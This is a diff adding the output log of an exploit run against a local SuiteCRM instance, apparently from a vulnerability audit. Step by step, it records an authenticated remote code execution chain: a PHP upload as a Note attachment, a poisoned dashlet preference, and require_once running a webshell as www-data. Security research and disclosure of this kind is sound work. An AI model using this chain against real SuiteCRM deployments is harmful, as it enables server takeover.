@@ -1,0 +1,17 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-011/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-011/../.venv
+========================================================================
+VULN-011: Authenticated RCE via dashlet-preference -> require_once
+target: http://localhost:33116
+========================================================================
+[INFO] sink: SugarController.php:889 require_once($pref['fileLocation']); pref written via un-gated Emails setPreference
+[SETUP] admin creates a disposable low-privilege user (is_admin=0)
+[SETUP] authenticated as low-priv user mod_ac3e9edc
+[STEP] uploading PHP payload as a Note attachment -> upload/<note_id>
+[PROOF] payload stored on disk at upload/78409b64-b031-40bf-be1e-13cab15f11bc (Note attachment, raw PHP bytes)
+[STEP] poisoning dashlets preference: fileLocation -> our uploaded file (no ACL on setPreference)
+[PROOF] setPreference stored dashlets['pwn']['fileLocation']=upload/78409b64-b031-40bf-be1e-13cab15f11bc (HTTP 200)
+[STEP] triggering configuredashlet -> require_once(upload/<nid>) executes our PHP
+[PROOF] webshell executed — response contains RCEMARK_ba8c0cf6:'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
+[OK] exploit confirmed — arbitrary command execution as the web user; `id` -> 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
+==> VULN-011: CONFIRMED — low-priv user achieved RCE (require_once of uploaded PHP); id => uid=33(www-data) gid=33(www-data) groups=33(www-data)
